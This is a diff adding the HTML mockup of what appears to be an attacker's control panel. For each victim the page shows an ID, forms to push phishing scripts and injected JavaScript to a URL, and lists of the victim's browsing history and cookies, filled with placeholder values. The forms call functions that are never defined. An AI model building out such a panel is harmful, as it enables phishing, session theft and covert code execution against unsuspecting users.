@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>UserInfo</title>
+    <link rel="stylesheet" href="bootstrap-4.0.0-dist/css/bootstrap.min.css"> 
+    <script src="bootstrap-4.0.0-dist/js/bootstrap.min.js"></script>
+    <link href="style2.css" rel="stylesheet">
+
+  </head>
+
+  <body>
+
+    <!-- Heading And ID -->
+    <table>
+        <tr>
+            <th align="left"><h1>User Info</h1></th>
+            <th align="left"><button class="btn btn-primary" type="button" onclick="goBack()">Go Back</button></th>
+        </tr>
+    </table>
+    <h5>ID =
+        <script>
+           /* var urlString = new String(document.URL);
+            var idString = urlString.substring(urlString.lastIndexOf("=")+1);
+            var id = parseInt(idString);
+            document.write(id);*/
+            
+            var id = localStorage.getItem("id");
+            document.write(id);
+            //This script extracts the id of the clicked-on-user from the localStorage and displays it
+        </script>
+    </h5>
+
+    <br>
+
+    <!-- Add Phishing -->
+    <form name="phishingForm" onsubmit "return phish()">
+        Add phishing script:<br>
+        <input type = "text" name = "Phishing_Script" placeholder = "Script"><br>
+        <input type = "text" name = "Phishing_URL" placeholder = "URL"><br>
+        <input type = "submit" name = "Submit_Phishing_Script">
+    </form>
+
+    <br>
+
+    <!-- Add Javascript -->
+    <form name="jsForm" onsubmit "return js()">
+        Add javascript execution script:<br>
+        <input type = "text" name = "JS_Script" placeholder = "Script"><br>
+        <input type = "text" name = "JS_URL" placeholder = "URL"><br>
+        <input type = "submit" name = "Submit_JS_Script">
+    </form>
+
+    <br>
+
+    <!-- History -->
+    <h2>History</h2>
+    <ul style="list-style-type:disc" id="historyList">
+        <li>google.com</li>
+        <li>yahoo.com</li>
+    </ul>
+
+    <br>
+
+    <!-- Cookies -->
+    <h2>Cookies</h2>
+    <table style = "width:100%" id="historyList">
+        <tr>
+            <th align="left">Name</th>
+            <th align="left">Domain</th>
+            <th align="left">Value</th>
+        </tr>
+        <tr>
+            <td>GoogleCookie</td>
+            <td>google.com</td>
+            <td>dsa21k123ljd1lw2ajd</td>
+        </tr>
+    </table>
+
+
+
+    <script type="text/javascript">
+        function goBack() {
+           window.location="index.html";
+        }
+    </script>
+
+
+
+  </body>
+</html>
